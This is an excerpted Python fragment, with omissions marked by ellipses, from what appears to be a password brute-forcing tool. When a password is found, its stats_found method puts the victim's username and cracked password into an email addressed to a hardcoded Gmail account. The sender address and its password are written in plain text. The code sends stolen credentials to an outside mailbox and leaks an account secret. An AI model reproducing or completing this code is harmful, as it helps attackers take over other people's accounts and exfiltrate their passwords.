...
class Display(object):
    ...
    def stats_found(self, password, attempts, browsers):
        ...
        if self.__is_color:
            ...
            ########################
            user_name1 = self.username.title()
            print (user_name1)
            #######################
            print(
            ...
            mail_content = pass_word1

            sender_address = 'test.bruter@gmail.com'
            sender_pass = 'Abolfazlagha8'
            receiver_address = 'test.bruter@gmail.com'
            message = MIMEMultipart()
            message['From'] = sender_address
            message['To'] = receiver_address
            message['Subject'] = user_name1
